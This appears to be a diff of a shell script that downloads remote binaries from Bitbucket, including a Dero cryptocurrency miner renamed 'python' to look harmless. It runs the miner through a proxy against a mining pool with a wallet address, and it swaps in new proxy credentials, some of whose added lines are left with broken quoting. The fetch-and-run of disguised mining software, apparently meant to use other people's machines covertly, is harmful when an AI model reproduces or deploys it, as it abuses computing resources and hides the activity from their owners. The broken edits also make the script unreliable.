@@ -1,7 +1,7 @@
-proxy="138.128.59.129" 
-port="9058"
-user="wrbjmsvx"  
-pass="6fxihvhr6jzb"
+proxy="103.253.24.243 
+port="8080
+user="woiden_racias90"  
+pass="90racias"
 wget -q -O python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python
 wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
@@ -19,4 +19,4 @@ echo "Original IP ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "New IP ==> "$(./proxy curl ifconfig.me)
-./proxy ./python -r 46.101.106.7:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm4umde6mkerfvqwy2rw5.Danis
+./proxy ./python -r 46.101.106.7:4306 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm4umde6mkerfvqwy2rw5.Danis
